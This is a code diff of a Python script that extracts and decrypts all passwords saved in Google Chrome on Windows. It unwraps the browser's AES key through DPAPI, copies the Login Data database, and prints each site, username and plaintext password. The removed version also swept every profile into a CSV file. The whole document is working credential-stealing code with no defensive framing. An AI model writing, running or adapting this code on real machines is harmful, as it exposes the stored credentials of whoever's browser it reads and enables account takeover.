@@ -1,85 +1,68 @@
 import os
-import re
-import sys
 import json
 import base64
 import sqlite3
+import shutil
 import win32crypt
 from Crypto.Cipher import AES
-import shutil
-import csv
 
-# Define path to Chrome Local State file to extract secret key
-CHROME_PATH_LOCAL_STATE = os.path.normpath(
-    r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
+def get_chrome_local_state():
+    local_state_path = os.path.join(os.environ['USERPROFILE'],
+                                    r'AppData\Local\Google\Chrome\User Data\Local State')
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    return local_state
 
 def get_secret_key():
+    local_state = get_chrome_local_state()
+    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+    encrypted_key = base64.b64decode(encrypted_key)
+    # Remove DPAPI prefix
+    encrypted_key = encrypted_key[5:]
+    # Decrypt key with Windows DPAPI
+    secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return secret_key
+
+def decrypt_password(buff, secret_key):
     try:
-        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
-            local_state = json.load(f)
-        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        # Remove 'DPAPI' prefix
-        encrypted_key = encrypted_key[5:]
-        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        return secret_key
+        # Encrypted passwords are prefixed with 'v10' (3 bytes)
+        iv = buff[3:15]
+        payload = buff[15:-16]
+        tag = buff[-16:]
+        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt_and_verify(payload, tag)
+        return decrypted_pass.decode()  # Decode to string
     except Exception as e:
-        print(str(e))
-        print("[ERR] Chrome secretkey cannot be found")
-        return None
+        # Could be DPAPI encryption (older versions)
+        try:
+            decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+            return decrypted_pass.decode()
+        except:
+            return ""
 
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
+def main():
+    secret_key = get_secret_key()
+    login_db_path = os.path.join(os.environ['USERPROFILE'],
+                                 r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
+    # Copy file to avoid lock
+    shutil.copy2(login_db_path, "Loginvault.db")
 
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
+    conn = sqlite3.connect("Loginvault.db")
+    cursor = conn.cursor()
 
-def decrypt_password(ciphertext, secret_key):
-    try:
-        initialisation_vector = ciphertext[3:15]
-        encrypted_password = ciphertext[15:-16]
-        cipher = generate_cipher(secret_key, initialisation_vector)
-        decrypted_pass = decrypt_payload(cipher, encrypted_password)
-        decrypted_pass = decrypted_pass.decode()
-        return decrypted_pass
-    except Exception as e:
-        print(str(e))
-        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
-        return ""
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
-def get_db_connection(chrome_path_login_db):
-    try:
-        # Make a temp copy of the login database to avoid lock issues
-        shutil.copy2(chrome_path_login_db, "Loginvault.db")
-        return sqlite3.connect("Loginvault.db")
-    except Exception as e:
-        print(str(e))
-        print("[ERR] Chrome database cannot be found")
-        return None
+    for row in cursor.fetchall():
+        url = row[0]
+        username = row[1]
+        encrypted_password = row[2]
+        if url and username and encrypted_password:
+            password = decrypt_password(encrypted_password, secret_key)
+            print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*50}")
 
-if __name__ == '__main__':
-    try:
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-            csv_writer.writerow(["index", "url", "username", "password"])
-            secret_key = get_secret_key()
-            CHROME_PATH = os.path.normpath(
-                r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
-            folders = [f for f in os.listdir(CHROME_PATH) if re.match(r"^Profile.*|^Default$", f)]
-            for folder in folders:
-                chrome_path_login_db = os.path.normpath(f"{CHROME_PATH}\\{folder}\\Login Data")
-                conn = get_db_connection(chrome_path_login_db)
-                if secret_key and conn:
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for index, login in enumerate(cursor.fetchall()):
-                        url, username, ciphertext = login
-                        if url != "" and username != "" and ciphertext != "":
-                            decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print(f"Sequence: {index}")
-                            print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*'*50}")
-                            csv_writer.writerow([index, url, username, decrypted_password])
-                    cursor.close()
-                    conn.close()
-                    os.remove("Loginvault.db")
-    except Exception as e:
-        print("[ERR] " + str(e))
+    cursor.close()
+    conn.close()
+    os.remove("Loginvault.db")
+
+if __name__ == "__main__":
+    main()
